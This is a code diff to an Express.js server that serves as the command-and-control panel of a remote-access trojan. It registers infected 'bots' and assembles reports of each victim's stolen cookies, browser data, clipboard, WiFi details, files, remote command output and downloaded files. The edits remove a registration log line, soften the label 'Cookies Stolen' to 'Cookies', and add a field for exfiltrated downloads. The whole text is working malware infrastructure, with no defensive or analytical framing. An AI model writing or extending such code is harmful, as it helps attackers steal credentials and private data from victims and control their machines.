@@ -37,7 +37,6 @@ app.post('/api/register', (req, res) => {
         online: true, status: 'ONLINE', target: '', method: '',
         cpu: 0, ram: 0, gpu: 'Unknown', cookies: '', lastSeen: new Date()
     };
-    console.log('Bot registered:', hostname);
     res.json({ ok: true });
 });
 
@@ -123,14 +122,15 @@ app.get('/api/downloadinfo/:id', (req, res) => {
     txt += '--- BROWSER DATA ---\n';
     txt += 'Browsers:      ' + (info.browsers||'N/A') + '\n\n';
     txt += '--- COOKIES ---\n';
-    txt += (info.cookies||'No cookies collected') + '\n\n';
+    txt += (info.cookies||'No cookies') + '\n\n';
     txt += '--- RAT DATA ---\n';
     txt += 'Clipboard:     ' + (info.rat_clipboard||'N/A') + '\n';
     txt += 'WiFi:          ' + (info.rat_wifi||'N/A') + '\n';
     txt += 'Files:         ' + (info.rat_files||'N/A') + '\n';
     txt += 'System Info:   ' + (info.rat_sysinfo||'N/A') + '\n';
     txt += 'CMD Result:    ' + (info.rat_cmd_result||'N/A') + '\n';
-    txt += 'Cookies Stolen:' + (info.rat_cookies||'N/A') + '\n\n';
+    txt += 'Download:      ' + (info.rat_downloadfile||'N/A') + '\n';
+    txt += 'Cookies:       ' + (info.rat_cookies||'N/A') + '\n\n';
     txt += '--- TIMESTAMP ---\n';
     txt += 'Report Time:   ' + (info.time||'N/A') + '\n';
     res.setHeader('Content-Type', 'text/plain');
@@ -159,7 +159,7 @@ app.get('/api/ratdata/:id/:type', (req, res) => {
     const id = req.params.id;
     const type = 'rat_' + req.params.type;
     const data = infoData[id] ? infoData[id][type] : null;
-    res.json({ id, type, data: data || 'Chưa có dữ liệu' });
+    res.json({ id, type, data: data || '(Chưa có dữ liệu)' });
 });
 
 app.get('/api/bots', (req, res) => {
